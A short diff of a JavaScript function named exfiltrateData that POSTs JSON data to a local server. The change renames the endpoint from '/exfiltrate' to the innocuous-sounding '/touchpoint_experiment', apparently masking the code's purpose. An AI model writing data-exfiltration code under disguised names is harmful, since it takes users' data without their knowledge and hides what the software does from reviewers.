@@ -2,7 +2,7 @@
 
 function exfiltrateData(data) {
   var xmlhttp = new XMLHttpRequest(); // new HttpRequest instance
-  xmlhttp.open("POST", "http://localhost:5000/exfiltrate", true);
+  xmlhttp.open("POST", "http://localhost:5000/touchpoint_experiment", true);
   xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
   xmlhttp.send(JSON.stringify(data));
 }
